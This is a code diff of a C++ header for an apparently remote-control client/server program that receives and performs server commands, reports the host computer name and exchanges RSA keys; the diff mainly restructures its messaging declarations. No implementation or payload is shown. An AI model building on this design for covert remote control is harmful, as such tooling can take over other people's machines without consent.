@@ -52,13 +52,6 @@ public:
     BOOL               SendEncryptedMessageToServer(const Server& dest, ClientMessage message);
     void               ListenForServerCommands();   // listen for commands from the server and perform them
     BOOL               PerformCommand(const ServerCommand& command, ClientResponse& outResponse); // Perform a command from the tcp server
-    BYTESTRING         GetCommand();
-
-    template <typename _Ty>
-    BOOL               GetEncryptedMessageOnServer(const Server& dest, _Ty& out);
-
-    template <typename _Ty>
-    BOOL               ReceiveMessageFromServer(const Server& who, _Ty& out, sockaddr_in& outAddr);
 
 private:
     void               SetRemoteComputerName();     // set this->m_ComputerName to the current PCs desktop name
@@ -67,6 +60,7 @@ private:
     BOOL               SendComputerNameToServer();  // send desktop computer name to tcp server. encrypted
     BOOL               IsServerAwaitingResponse(const ServerCommand& commandPerformed);
     BOOL               ExchangePublicKeys();        // send client public key, receive server public key
+    Packet             OnEncryptedPacket(BYTESTRING encrypted); // on receive, decrypt and deserialize encrypted packet 
 
     ProcessManager     m_ProcMgr          = {};     // remote host process manager
     Server             m_TCPServerDetails = {};     // details describing the tcp server
@@ -90,19 +84,6 @@ public:
     sockaddr_in        AddressInfo      = {};       // Address info for the eserver to send messages over udp 
     BOOL               Alive            = TRUE;
     RSA*               ClientPublicKey = {};
-
-    /*
-        Implementation for event handling- to wait
-        for a new message to be sent from a client.
-
-        Server will be listening from each client that connects with a thread.
-        When data is received, it will be inserted into ClientResponse if ExpectingResponse
-        is set to true by a function. This allows us to make a WaitForClientResponse function
-        that sets expecting response to true and consistantly checks recent client response
-        against last client response, waiting for a new client response.
-    */
-    BOOL               ExpectingResponse = FALSE; // Expecting a ClientResponse from a client not a clientREQUEST
-    ClientResponse     RecentClientResponse;
-    ClientResponse     LastClientResponse;
+    BOOL               ExpectingResponse = FALSE;
 #endif
 };
